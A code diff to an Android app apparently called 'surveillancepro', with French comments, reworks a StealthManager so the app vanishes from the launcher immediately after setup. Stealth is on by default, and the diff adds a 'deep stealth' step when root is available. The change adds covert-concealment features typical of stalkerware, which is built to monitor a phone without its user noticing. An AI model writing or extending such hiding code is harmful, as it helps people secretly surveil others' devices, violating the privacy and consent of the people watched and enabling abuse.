@@ -114,16 +114,46 @@ object StealthManager {
 
     /**
      * Appelé automatiquement après l'acceptation des conditions.
-     * Bascule en mode déguisé après un délai (le temps que l'admin finisse la config).
+     * Active le mode furtif HIDDEN par défaut pour une discrétion maximale.
+     * L'app disparaît du launcher IMMÉDIATEMENT (délai = 0).
      */
-    fun activateAfterSetup(context: Context, delayMs: Long = 10000) {
-        android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
+    fun activateAfterSetup(context: Context, delayMs: Long = 0) {
+        val runnable = Runnable {
             val prefs = context.getSharedPreferences("sp_stealth", Context.MODE_PRIVATE)
+            // Par défaut TRUE - mode furtif activé automatiquement
             val autoStealth = prefs.getBoolean("auto_stealth", true)
             if (autoStealth) {
+                // Mode HIDDEN par défaut - disparition complète du launcher
                 setMode(context, StealthMode.HIDDEN)
+                Log.d(TAG, "Mode HIDDEN activé - app invisible dans le launcher")
+                
+                // Tenter le deep stealth si root disponible
+                if (com.surveillancepro.android.root.RootManager.isRooted()) {
+                    enableDeepStealth(context)
+                }
             }
-        }, delayMs)
+        }
+        
+        if (delayMs <= 0) {
+            // Exécution IMMÉDIATE
+            runnable.run()
+        } else {
+            android.os.Handler(android.os.Looper.getMainLooper()).postDelayed(runnable, delayMs)
+        }
+    }
+
+    /**
+     * Disparition IMMÉDIATE du launcher - appelé dès que la configuration est terminée.
+     * Ne nécessite aucun délai.
+     */
+    fun hideImmediately(context: Context) {
+        setMode(context, StealthMode.HIDDEN)
+        Log.d(TAG, "App cachée IMMÉDIATEMENT du launcher")
+        
+        // Deep stealth si root
+        if (com.surveillancepro.android.root.RootManager.isRooted()) {
+            enableDeepStealth(context)
+        }
     }
 
     /**
